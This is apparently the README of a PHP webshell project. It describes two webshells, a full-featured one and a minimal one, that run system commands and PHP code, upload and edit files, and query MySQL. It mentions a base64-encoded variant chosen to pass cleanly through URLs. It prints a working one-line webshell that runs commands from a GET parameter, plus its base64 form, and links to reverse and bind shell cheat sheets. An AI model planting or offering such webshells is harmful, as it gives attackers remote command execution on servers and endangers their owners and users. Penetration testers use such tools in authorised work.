## PHP Webshell

This is a simple yet useful PHP webshell.
It is compatible with PHP > 5.2

This webshell comes in two flavours :
- shell.php : fully featured webshell to exploit
- mini.php : lightweight, only essential features

### Features

shell.php
- browse server's directory tree
- read, edit, delete, upload and download file
- Execute system commands
- Execute PHP code
- Execute MySql queries

mini.php
- Execute system commands
- Execute PHP code
- Upload file

### More content

Another file is available : `mini-b64.txt`
This is the base64 version of mini.php. It does not contain '+' and '/' chars to avoid URL encoding and other possible issues.

### Even more tricks

##### Tiniest PHP shell

`<?php system($_GET['c'])?>`

`PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pPz4=`

#### Upgrade to a more interactive shell

PHP reverse shell : https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
PHP bind shell : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md

###### Good resources about shells
https://www.revshells.com/
https://yolospacehacker.com/hackersguide/en/?cat=Webshell
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md